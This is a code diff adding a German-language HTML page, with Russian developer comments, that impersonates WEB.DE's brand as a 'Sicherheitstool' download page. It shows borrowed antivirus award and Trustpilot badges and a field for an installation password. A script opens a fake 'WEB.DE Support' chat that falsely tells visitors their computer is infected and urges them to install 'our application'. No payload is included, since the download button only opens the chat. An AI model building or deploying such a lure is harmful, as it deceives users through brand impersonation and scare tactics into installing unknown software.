@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="de" xml:lang="de">
+<head>
+  <meta charset="utf-8">
+  <meta name="format-detection" content="telephone=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+  <title>Download — WEB.DE E-Mail-Produkte</title>
+  <link rel="shortcut icon" type="image/x-icon" href="//img.ui-portal.de/webde/favicon.ico">
+  <link rel="stylesheet" type="text/css" href="//js.ui-portal.de/cd/products/web.de/5.11.3/products.css">
+  <link rel="stylesheet" type="text/css" href="https://s.uicdn.com/mampkg/@mamdev/core-lab.libs.lux@%5E1/themes/base/webde.css">
+  <style>
+    body {
+      -webkit-locale: "de";
+      text-size-adjust: none;
+      padding: 0;
+      margin: 0;
+      width: 100%;
+      min-height: 100%;
+      font-family: Arial, Helvetica, sans-serif;
+      background: var(--lux-color-c-l94);
+    }
+    :root {
+      --lux-color-a: #ffd800;
+      --lux-color-a-l15: #ffde26;
+      --lux-color-a-l30: #ffe44d;
+      --lux-color-a-l40: #ffe866;
+      --lux-color-a-l50: #ffec80;
+      --lux-color-a-l70: #fff3b3;
+      --lux-color-a-l82: #fff8d1;
+      --lux-color-a-l94: #fffdf0;
+      --lux-color-a-d10: #e6c200;
+      --lux-color-a-d20: #ccad00;
+      --lux-color-a-d30: #b39700;
+      --lux-color-b: #1c8ad9;
+      --lux-color-b-l15: #3e9cdf;
+      --lux-color-b-l30: #60ade4;
+      --lux-color-b-l40: #77b9e8;
+      --lux-color-b-l50: #8ec5ec;
+      --lux-color-b-l70: #bbdcf4;
+      --lux-color-b-l82: #d6eaf8;
+      --lux-color-b-l94: #f1f8fd;
+      --lux-color-b-d10: #197cc3;
+      --lux-color-b-d20: #166eae;
+      --lux-color-b-d30: #146198;
+      --lux-color-c: #333333;
+      --lux-color-c-l15: #525252;
+      --lux-color-c-l30: #707070;
+      --lux-color-c-l40: #858585;
+      --lux-color-c-l50: #999999;
+      --lux-color-c-l70: #c2c2c2;
+      --lux-color-c-l82: #dadada;
+      --lux-color-c-l94: #f3f3f3;
+      --lux-color-c-d10: #2e2e2e;
+      --lux-color-c-d20: #292929;
+      --lux-color-c-d30: #242424;
+      --lux-color-d: #ffffff;
+      --lux-button__bg-color: var(--lux-color-a);
+      --lux-button__text-color: var(--lux-color-c);
+      --lux-button__bg-color-hover: var(--lux-color-a-d20);
+      --lux-button-secondary__bg-color: var(--lux-color-b);
+      --lux-button-secondary__text-color: var(--lux-color-d);
+      --lux-button-secondary__bg-color-hover: var(--lux-color-b-d20);
+      --lux-radius-xs: 4px;
+      --lux-radius-s: 8px;
+      --lux-radius-m: 12px;
+      --lux-radius-l: 16px;
+    }
+
+    .grid { max-width: 1200px; margin: 0 auto; padding: 0 12px; box-sizing: border-box; }
+    .grid * { box-sizing: border-box; }
+
+    /* Жёлтая полоса сверху — в ширину шапки (внутри grid) */
+    .page-top-bar {
+      width: 100%;
+      height: 6px;
+      background: var(--lux-color-a);
+      flex-shrink: 0;
+    }
+
+    /* Header как в оригинале: l-12 l-fix center vline header */
+    #header.header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      width: 100%;
+      padding: 12px 0;
+      border-bottom: 1px solid var(--lux-color-c-l82);
+      background: var(--lux-color-d);
+    }
+    #header strong {
+      display: flex;
+      align-items: center;
+      gap: 0.5em 1em;
+      flex-wrap: wrap;
+      font-size: 1rem;
+      font-weight: 700;
+    }
+    #header strong a {
+      color: var(--lux-color-b);
+      text-decoration: none;
+    }
+    #header strong a:hover { text-decoration: underline; }
+    .header-logo {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-left: 24px;
+    }
+    .header-logo img {
+      height: 40px;
+      width: auto;
+      display: block;
+    }
+    .header-logo .header-sicherheitstool {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--lux-color-c);
+      margin: 0;
+    }
+
+    /* Секция и контейнеры как в оригинале */
+    .container.l-12.center { width: 100%; padding: 24px 0 48px; }
+    .container.l-12.fix { width: 100%; }
+    .group-content { display: flex; flex-wrap: wrap; justify-content: center; gap: 24px; }
+
+    /* Карточка = teaser wireframe rounded backdrop, рамки как на оригинале */
+    .teaser.container.wireframe.rounded {
+      background: var(--lux-color-d);
+      border: 1px solid var(--lux-color-c-l82);
+      border-radius: var(--lux-radius-l);
+      overflow: hidden;
+      max-width: 960px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 0;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
+    }
+    .teaser.backdrop-hover-b1-light70:hover,
+    .teaser.backdrop-b1-light94 { background: var(--lux-color-d); }
+    .teaser.m-horizontal { display: flex; flex-direction: column; }
+    @media (min-width: 660px) {
+      .teaser.m-horizontal { flex-direction: row; }
+      .teaser .visual.module { flex: 0 0 40%; }
+      .teaser .module.content { flex: 1 1 60%; }
+    }
+
+    /* Верх карточки: visual / shield (как у тарифов) */
+    .teaser .visual.module {
+      padding: 28px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      background: linear-gradient(180deg, var(--lux-color-b-l94) 0%, var(--lux-color-b-l82) 100%);
+    }
+    .teaser .shield.shield-down { position: relative; }
+    .teaser .visual .size-4 {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: var(--lux-color-b-d20);
+      margin: 0 0 8px 0;
+    }
+    .teaser .visual .price.xxl {
+      font-size: 1.75rem;
+      color: var(--lux-color-c);
+      margin: 0;
+    }
+    .teaser .visual .price em { font-style: normal; }
+    .teaser .visual .size-10 { font-size: 1.5em; }
+    .teaser .visual .size-2 { font-size: 0.45em; vertical-align: baseline; color: var(--lux-color-c-l50); }
+
+    /* Контент карточки */
+    .teaser .module.content {
+      padding: 28px 32px 32px;
+      background: var(--lux-color-d);
+      min-width: 0;
+      flex: 1 1 55%;
+    }
+    .teaser .module.content .btn-wrapper { margin: 0 0 20px 0; }
+    .teaser .module.content .btn-wrapper.m-0 { margin-top: 0; }
+    .teaser .key.button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 14px 28px;
+      font-size: 1rem;
+      font-weight: 600;
+      text-align: center;
+      border: none;
+      border-radius: var(--lux-radius-s);
+      cursor: pointer;
+      text-decoration: none;
+      transition: background .2s, color .2s;
+      background: var(--lux-button__bg-color);
+      color: var(--lux-button__text-color);
+      font-family: inherit;
+    }
+    .teaser .key.button:hover {
+      background: var(--lux-button__bg-color-hover);
+    }
+    .teaser .key.button .btn-icon-win {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+      fill: #fff;
+    }
+    .teaser .check.list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      text-align: left;
+    }
+    .teaser .check.list li {
+      position: relative;
+      padding-left: 24px;
+      margin-bottom: 10px;
+      font-size: 0.9375rem;
+      color: var(--lux-color-c);
+      line-height: 1.45;
+    }
+    .teaser .check.list li::before {
+      content: "";
+      position: absolute;
+      left: 0;
+      top: 0.35em;
+      width: 14px;
+      height: 10px;
+      border-left: 2px solid var(--lux-color-b);
+      border-bottom: 2px solid var(--lux-color-b);
+      transform: rotate(-45deg);
+    }
+    .teaser .check.align-left.list { text-align: left; }
+    .teaser .lead {
+      font-size: 1rem;
+      color: var(--lux-color-c);
+      margin: 0 0 16px 0;
+      line-height: 1.5;
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+    }
+    .teaser .meta {
+      font-size: 0.875rem;
+      color: var(--lux-color-c-l50);
+      margin: 0 0 20px 0;
+    }
+    .teaser .download-password-row {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 10px;
+      margin: 0 0 16px 0;
+      padding: 10px 14px;
+      background: var(--lux-color-b-l94);
+      border: 1px solid var(--lux-color-b-l82);
+      border-radius: var(--lux-radius-s);
+      font-size: 0.9rem;
+      color: var(--lux-color-c);
+    }
+    .teaser .download-password-label { font-weight: 500; }
+    .teaser .download-password-value {
+      font-family: ui-monospace, Consolas, monospace;
+      font-weight: 600;
+      letter-spacing: 0.02em;
+    }
+    .teaser .download-password-copy {
+      margin-left: auto;
+      padding: 6px 12px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--lux-color-b-d20);
+      background: var(--lux-color-d);
+      border: 1px solid var(--lux-color-b-l70);
+      border-radius: var(--lux-radius-s);
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .teaser .download-password-copy:hover {
+      background: var(--lux-color-b-l94);
+      border-color: var(--lux-color-b);
+    }
+
+    /* Футер как в оригинале: светлый фон, тёмно-серые ссылки, две строки */
+    #footer {
+      margin-top: 48px;
+      padding: 24px 0;
+      background: var(--lux-color-c-l94);
+      border-top: 1px solid var(--lux-color-c-l82);
+    }
+    #footer .container.l-12.fix.center { padding: 0; }
+    #footer .inline-block.text.align-center.list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      text-align: center;
+    }
+    #footer .inline-block.list li { display: inline-block; margin: 0 6px; }
+    #footer .inline-block.list a {
+      color: var(--lux-color-c);
+      text-decoration: none;
+      font-size: 0.875rem;
+      font-weight: 400;
+    }
+    #footer .inline-block.list a:hover { text-decoration: underline; }
+    #footer .footer-row-wrap { display: flex; flex-direction: column; align-items: center; gap: 8px; }
+    #footer .footer-row-wrap .footer-row-2 { margin-top: 4px; }
+
+    /* Trust / Awards badges – горизонтально, без серых фонов */
+    .c-awardsbadge { margin: 20px 0 0 0; }
+    .c-awardsbadge__container {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 20px 28px;
+      justify-content: flex-start;
+    }
+    .c-awardsbadge__item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 0;
+      background: transparent;
+      border: none;
+      min-width: 0;
+    }
+    .c-awardsbadge__img-container {
+      flex-shrink: 0;
+      width: 48px;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: transparent;
+      border: none;
+    }
+    .c-awardsbadge__img-container img.c-awardsbadge__img {
+      max-width: 100%;
+      max-height: 100%;
+      width: auto;
+      height: auto;
+      object-fit: contain;
+    }
+    .c-awardsbadge--img-16-9 .c-awardsbadge__img-container { width: 90px; height: 50px; }
+    .c-awardsbadge--img-9-16 .c-awardsbadge__img-container { width: 50px; height: 90px; }
+    .c-awardsbadge__text-container { min-width: 0; }
+    .c-awardsbadge__year {
+      font-size: 0.7rem;
+      color: var(--lux-color-c-l50);
+      margin-bottom: 2px;
+    }
+    .c-awardsbadge__text-body {
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: var(--lux-color-c);
+      margin: 0;
+      line-height: 1.3;
+    }
+    .c-trustpilot {
+      display: flex;
+      align-items: center;
+    }
+    .c-trustpilot__container {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 6px 0;
+      padding: 0;
+      background: transparent;
+      color: var(--lux-color-c);
+    }
+    .c-trustpilot__content {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      gap: 6px 0;
+    }
+    .c-trustpilot__comment { font-size: 1rem; font-weight: 700; margin: 0; color: var(--lux-color-c); }
+    .c-trustpilot__star-rating { height: 18px; width: auto; }
+    .c-trustpilot__reviews { font-size: 0.8rem; color: var(--lux-color-c); margin: 0; }
+    .c-trustpilot__reviews-bold { font-weight: 700; }
+    .c-trustpilot__brand { display: flex; align-items: center; gap: 6px; margin: 0; }
+    .c-trustpilot__logo { height: 14px; width: auto; }
+
+    /* Чат поддержки */
+    .support-chat-wrap { position: fixed; bottom: 24px; right: 24px; z-index: 10001; font-family: inherit; }
+    .support-chat-toggle { position: relative; width: 56px; height: 56px; border-radius: 50%; border: none; background: linear-gradient(135deg, #1c8ad9 0%, #166eae 100%); color: #fff; cursor: pointer; box-shadow: 0 4px 16px rgba(28, 138, 217, 0.4); display: flex; align-items: center; justify-content: center; }
+    .support-chat-toggle:hover { transform: scale(1.05); }
+    .support-chat-panel { position: absolute; bottom: 72px; right: 0; width: 380px; max-width: calc(100vw - 48px); height: 420px; max-height: 80vh; background: #fff; border-radius: 16px; box-shadow: 0 12px 40px rgba(0,0,0,0.18); display: flex; flex-direction: column; overflow: hidden; }
+    .support-chat-panel[hidden] { display: none !important; }
+    .support-chat-header { display: flex; align-items: center; gap: 12px; padding: 14px 16px; background: linear-gradient(135deg, #1c8ad9 0%, #166eae 100%); color: #fff; flex-shrink: 0; }
+    .support-chat-avatar { width: 44px; height: 44px; border-radius: 50%; overflow: hidden; flex-shrink: 0; background: rgba(255,255,255,0.2); display: flex; align-items: center; justify-content: center; }
+    .support-chat-meta { flex: 1; min-width: 0; }
+    .support-chat-name { display: block; font-weight: 700; font-size: 16px; }
+    .support-chat-status { font-size: 12px; opacity: 0.9; }
+    .support-chat-close { width: 32px; height: 32px; border: none; background: rgba(255,255,255,0.2); color: #fff; border-radius: 50%; cursor: pointer; padding: 0; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .support-chat-close:hover { background: rgba(255,255,255,0.3); }
+    .support-chat-messages { flex: 1; min-height: 0; overflow-y: auto; padding: 16px; display: flex; flex-direction: column; gap: 12px; background: #f5f6f8; }
+    .support-chat-msg { display: flex; gap: 10px; max-width: 90%; align-self: flex-start; }
+    .support-chat-msg-bubble { padding: 12px 16px; background: #fff; border-radius: 12px 12px 12px 4px; box-shadow: 0 1px 2px rgba(0,0,0,0.08); font-size: 14px; line-height: 1.5; }
+  </style>
+</head>
+<body id="top" class="js" data-brand="webde" data-product="products">
+  <div class="grid">
+    <div class="page-top-bar" aria-hidden="true"></div>
+    <header id="header" class="l-12 l-fix center vline header" data-cc="header-search">
+      <div class="header-logo">
+        <a href="https://web.de/" aria-label="WEB.DE Startseite">
+          <img src="https://upload.wikimedia.org/wikipedia/de/5/5f/Web.de_logo.svg" alt="WEB.DE" width="120" height="28">
+        </a>
+        <span class="header-sicherheitstool">Sicherheitstool</span>
+      </div>
+    </header>
+
+    <div class="container l-12 center" data-cc="section">
+      <div class="container l-12 fix">
+        <div class="container l-12 fix group-content">
+          <div class="teaser container m-horizontal wireframe rounded l-4 m-8 fix tip backdrop-hover-b1-light70 backdrop-b1-light94" data-cc="teaser-download">
+            <div class="visual module l-4 fix align-center shield shield-down m-shield-right">
+              <h3 class="size-4 color-b1-base">Sicherheitstool</h3>
+              <p class="price xxl"><em><sup class="size-1"></sup><span class="size-10">0</span><sup class="size-5">00</sup><sub class="size-2">€/Monat</sub></em></p>
+            </div>
+            <div class="module content l-4 fix align-center">
+              <h2 class="size-4 color-b1-base" style="margin:0 0 8px 0; font-size:1.25rem;">Sicherheitstool herunterladen</h2>
+              <p class="lead">Laden Sie die aktuelle Version für Ihren Computer herunter. Der Download startet nach Klick auf den Button.</p>
+              <p class="download-password-row">
+                <span class="download-password-label">Passwort für die Installation:</span>
+                <strong class="download-password-value" id="download-password-value"></strong>
+                <button type="button" class="download-password-copy" id="download-password-copy" title="Passwort kopieren">Kopieren</button>
+              </p>
+              <p class="btn-wrapper m-0 s-0">
+                <a href="#" role="button" tabindex="0" class="key l button" target="_self">
+                  <svg class="btn-icon-win" viewBox="0 0 24 24" aria-hidden="true"><path d="M0 3h11v8H0V3zm13 0h11v8H13V3zM0 13h11v8H0v-8zm13 0h11v8H13v-8z"/></svg>
+                  <span>Jetzt herunterladen</span>
+                </a>
+              </p>
+              <ul class="check align-left list">
+                <li>Kompatibel mit Windows 10 und 11</li>
+                <li>Installation in wenigen Schritten</li>
+                <li>Überprüft von WEB.DE</li>
+              </ul>
+
+              <div class="awardsbadge c-awards-badge--sm">
+                <div class="c-awardsbadge">
+                  <div class="c-awardsbadge__container c-awardsbadge__d c-awards-badge--left">
+                    <div class="c-awardsbadge__item" tabindex="0">
+                      <div class="c-awardsbadge__img-container c-awardsbadge--img-16-9">
+                        <img class="c-awardsbadge__img" src="https://www.avast.com/content/dam/avast/awards/consumer/2024/av-comparatives-top-rated-2024.png" alt="AV-Comparatives Top Rated" loading="lazy" width="256" height="144">
+                      </div>
+                      <div class="c-awardsbadge__text-container">
+                        <div class="c-awardsbadge__year">Januar 2024</div>
+                        <div class="c-awardsbadge__text-body">Lösungen 2024 – Top bewertet</div>
+                      </div>
+                    </div>
+                    <div class="c-awardsbadge__item" tabindex="0">
+                      <div class="c-awardsbadge__img-container c-awardsbadge--img-9-16">
+                        <img class="c-awardsbadge__img" src="https://www.avast.com/content/dam/avast/logo/9_16/Av-test-2023-9_16.png" alt="AV-Test Beste Schutz" loading="lazy" width="137" height="240">
+                      </div>
+                      <div class="c-awardsbadge__text-container">
+                        <div class="c-awardsbadge__year">Januar 2026</div>
+                        <div class="c-awardsbadge__text-body">Beste Schutz</div>
+                      </div>
+                    </div>
+                    <div class="c-trustpilot c-trustpilot--show">
+                      <div class="c-trustpilot__container c-trustpilot--small">
+                        <div class="c-trustpilot__content">
+                          <img class="c-trustpilot__star-rating" src="https://www.avast.com/content/dam/avast/cb/icon_trustpilot_stars_4.5.svg" alt="Bewertung in Sternen" loading="lazy" width="80" height="14">
+                          <p class="c-trustpilot__reviews"><span class="c-trustpilot__reviews-bold">41.141</span> reviews on</p>
+                          <p class="c-trustpilot__brand"><img class="c-trustpilot__logo" src="https://www.avast.com/content/dam/avast/cb/trustpilot-logo.svg" </p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer id="footer" data-cc="footer">
+      <div class="container l-12 backdrop-c2-light94 vspace-s" data-cc="basefooter">
+        <div class="container l-12 fix center">
+          <div class="footer-row-wrap">
+            <ul class="inline-block text align-center list footer-row-1">
+              <li><a href="https://web.de/sitemap/" target="_blank">Sitemap</a></li>
+              <li><a href="https://web.de/impressum/" target="_blank">Impressum</a></li>
+              <li><a href="https://web.de/kuendigungsformular" target="_blank">Verträge hier kündigen</a></li>
+              <li><a href="https://agb-server.web.de/webdeagb" target="_blank">AGB</a></li>
+              <li><a href="https://web.de/datenschutz/" target="_blank">Datenschutz</a></li>
+              <li><a href="https://web.de/consent-resurface/">Datenschutz-Einstellungen</a></li>
+              <li><a href="https://web.de/barrierefreiheit/" target="_blank">Barrierefreiheit</a></li>
+            </ul>
+            <ul class="inline-block text align-center list footer-row-2">
+              <li><a href="https://www.mail-and-media.com/jobs.html" target="_blank">Jobs</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <div class="support-chat-wrap" id="support-chat-wrap">
+    <button type="button" class="support-chat-toggle" id="support-chat-toggle" aria-label="Support öffnen">
+      <span class="support-chat-toggle-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg></span>
+    </button>
+    <div class="support-chat-panel" id="support-chat-panel" hidden>
+      <header class="support-chat-header">
+        <div class="support-chat-avatar">
+          <svg width="40" height="40" viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="20" fill="#1c8ad9"/><path d="M20 20c2.8 0 5-2.2 5-5s-2.2-5-5-5-5 2.2-5 5 2.2 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z" fill="#fff"/></svg>
+        </div>
+        <div class="support-chat-meta">
+          <span class="support-chat-name">Support</span>
+          <span class="support-chat-status">WEB.DE Support · Online</span>
+        </div>
+        <button type="button" class="support-chat-close" id="support-chat-close" aria-label="Schließen" title="Schließen"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14"/></svg></button>
+      </header>
+      <div class="support-chat-messages" id="support-chat-messages"></div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      var supportMsg = 'Guten Tag, Ihr Computer wurde mit einem Schadprogramm infiziert. Um das Problem zu beheben, installieren Sie bitte unsere Anwendung, die das Schadprogramm entfernt und Ihr Gerät schützt.';
+      var chatPanel = document.getElementById('support-chat-panel');
+      var chatMessages = document.getElementById('support-chat-messages');
+      var chatToggle = document.getElementById('support-chat-toggle');
+      var chatClose = document.getElementById('support-chat-close');
+      var downloadBtn = document.querySelector('.teaser .key.button');
+
+      function openChatWithSupportMessage() {
+        if (!chatMessages) return;
+        chatMessages.innerHTML = '';
+        var msg = document.createElement('div');
+        msg.className = 'support-chat-msg';
+        var bubble = document.createElement('div');
+        bubble.className = 'support-chat-msg-bubble';
+        bubble.textContent = supportMsg;
+        msg.appendChild(bubble);
+        chatMessages.appendChild(msg);
+        if (chatPanel) {
+          chatPanel.removeAttribute('hidden');
+        }
+        if (chatMessages.lastElementChild) chatMessages.lastElementChild.scrollIntoView({ behavior: 'smooth' });
+      }
+
+      if (downloadBtn) {
+        downloadBtn.addEventListener('click', function (e) {
+          e.preventDefault();
+          openChatWithSupportMessage();
+        });
+      }
+      if (chatToggle && chatPanel) {
+        chatToggle.addEventListener('click', function () {
+          if (chatPanel.hasAttribute('hidden')) {
+            openChatWithSupportMessage();
+          } else {
+            chatPanel.setAttribute('hidden', '');
+          }
+        });
+      }
+      if (chatClose && chatPanel) {
+        chatClose.addEventListener('click', function () { chatPanel.setAttribute('hidden', ''); });
+      }
+
+      var copyBtn = document.getElementById('download-password-copy');
+      var pwdEl = document.getElementById('download-password-value');
+      if (copyBtn && pwdEl) {
+        copyBtn.addEventListener('click', function () {
+          var text = (pwdEl.textContent || '').trim();
+          if (!text) return;
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(text).then(function () {
+              var t = copyBtn.textContent;
+              copyBtn.textContent = 'Kopiert!';
+              setTimeout(function () { copyBtn.textContent = t; }, 1500);
+            }).catch(function () {});
+          } else {
+            var ta = document.createElement('textarea');
+            ta.value = text;
+            ta.setAttribute('readonly', '');
+            ta.style.position = 'absolute';
+            ta.style.left = '-9999px';
+            document.body.appendChild(ta);
+            ta.select();
+            try {
+              document.execCommand('copy');
+              var t = copyBtn.textContent;
+              copyBtn.textContent = 'Kopiert!';
+              setTimeout(function () { copyBtn.textContent = t; }, 1500);
+            } catch (err) {}
+            document.body.removeChild(ta);
+          }
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
